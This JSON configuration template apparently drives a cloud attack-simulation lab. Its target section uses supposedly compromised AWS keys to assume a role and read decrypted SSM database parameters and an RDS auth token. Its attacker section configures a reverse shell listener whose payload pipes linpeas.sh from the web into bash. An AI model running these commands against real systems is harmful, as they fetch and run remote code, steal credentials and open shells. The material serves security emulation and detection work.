{
  "context" :  {
    "global": {
      "environment"          : "${ environment }",
      "deployment"           : "${ deployment }"
    },
    "aws" :  {
      "enabled" : true,
      "ssm" :  {
        "target": {
          "execute": {
            "generate_web_traffic": {
              "enabled": true,
              "delay": 60,
              "urls": [
                "http://localhost:8091/cast"
              ]
            },
            "generate_aws_cli_traffic": {
              "enabled": true,
              "compromised_keys_user" : "khon.traktour-${deployment}@interlacelabs",
              "profile" : "aws-traffic",
              "commands": [
                "if ! command -v jq; then curl -LJ -o /usr/bin/jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 /usr/bin/jq; fi",
                "PROFILE=aws-traffic",
                "log \"User: $(aws sts get-caller-identity --profile=$PROFILE)\"",
                "REGION=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/document | jq -r .region)",
                "ROLE_NAME=\"rds_user_access_role_ciemdemo\"",
                "SESSION_NAME=\"local-user\"",
                "log \"Getting assumed role credentials...\"",
                "AWS_ACCOUNT_NUMBER=$(aws sts get-caller-identity --profile=$PROFILE | jq -r '.Account')",
                "CREDS=$(aws sts assume-role --profile=$PROFILE --role-arn \"arn:aws:iam::$AWS_ACCOUNT_NUMBER:role/$ROLE_NAME\" --role-session-name \"$SESSION_NAME\")",
                "AWS_ACCESS_KEY_ID=$(echo \"$CREDS\" | jq -r '.Credentials.AccessKeyId')",
                "AWS_SECRET_ACCESS_KEY=$(echo \"$CREDS\" | jq -r '.Credentials.SecretAccessKey')",
                "AWS_SESSION_TOKEN=$(echo \"$CREDS\" | jq -r '.Credentials.SessionToken')",
                "AWS_DEFAULT_REGION=$REGION",
                "AWS_DEFAULT_OUTPUT=json",
                "log \"Setting assumed role credentials...\"",
                "PROFILE=\"rds_user_access_role_ciemdemo\"",
                "aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE",
                "aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE",
                "aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE",
                "aws configure set region $REGION --profile=$PROFILE",
                "aws configure set output json --profile=$PROFILE",
                "log \"AssumedRole: $(aws sts get-caller-identity --profile=$PROFILE)\"",
                "log \"Getting db credentials as assumed role...\"",
                "DBHOST=\"$(aws ssm get-parameter --profile=$PROFILE --name=\"db_host\" --with-decryption $opts| jq -r '.Parameter.Value' | cut -d \":\" -f 1)\"",
                "DBUSER=\"$(aws ssm get-parameter --profile=$PROFILE --name=\"db_username\" --with-decryption $opts | jq -r '.Parameter.Value')\"",
                "DBPORT=\"$(aws ssm get-parameter --profile=$PROFILE --name=\"db_port\" --with-decryption $opts | jq -r '.Parameter.Value')\"",
                "TOKEN=\"$(aws rds generate-db-auth-token --profile=$PROFILE --hostname $DBHOST --port $DBPORT --username $DBUSER)\"",
                "log \"DBHOST: $DBHOST\"",
                "log \"DBUSER: $DBUSER\"",
                "log \"DBPORT: $DBPORT\"",
                "log \"TOKEN: $TOKEN\""
              ]
            }
          }
        },
        "attacker": {
          "responder": {
            "reverse_shell_multistage": {
              "enabled": true,
              "listen_ip": "0.0.0.0",
              "listen_port": "4444",
              "windows_listen_port": "4445",
              "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files | tee /tmp/linpeas.txt",
              "windows_payload": "if (Test-Path \"C:\\Windows\\Temp\\pwned.txt\") { (Get-Item \"C:\\Windows\\Temp\\pwned.txt\").LastWriteTime = Get-Date } else { New-Item -ItemType File -Path \"C:\\Windows\\Temp\\pwned.txt\" }",
              "attack_delay": 50400,
              "reverse_shell_host" : "log4jc-attacker-${ deployment }.${ attacker_dynu_dns_domain }",
              "iam2rds_role_name": "rds_user_access_role_ciemdemo"
            }
          }
        }
      }
    }
  }
}